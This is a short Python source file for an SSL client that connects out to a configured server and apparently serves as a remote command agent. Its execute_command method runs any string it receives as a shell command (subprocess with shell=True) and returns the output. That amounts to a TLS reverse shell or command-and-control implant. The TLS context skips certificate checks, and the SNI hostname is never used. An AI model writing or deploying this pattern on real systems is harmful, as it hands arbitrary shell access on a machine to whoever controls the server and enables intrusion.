import socket
import ssl
from utils.logger import setup_logger
import subprocess

logger = setup_logger()


class SSLClient:
    def __init__(
        self,
        server_host,
        server_port,
        sni_hostname,
        client_cert,
        client_key,
    ):
        self.server_host = server_host
        self.server_port = server_port
        self.sni_hostname = sni_hostname
        self._context = ssl.SSLContext()
        self._context.load_cert_chain(client_cert, client_key)
        self._sock = None
        self._ssock = None

    def close(self):
        if self._ssock:
            self._ssock.close()
        if self._sock:
            self._sock.close()

    def connect(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._ssock = self._context.wrap_socket(
            self._sock,
        )
        self._ssock.connect((self.server_host, self.server_port))

    def send(self, msg):
        self._ssock.send(msg.encode())

    def receive(self):
        try:
            data = self._ssock.recv(4096)

            if not data:
                return None

            return data.decode()

        except Exception as e:
            print(f"Receive error: {e}")
            return None

    def execute_command(self, command: str) -> str:
        if command == "ping":
            return "pong"

        if command == "hello":
            return "hello from client"

        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT
            )

            return output.decode()

        except Exception as e:
            return f"Error: {e}"
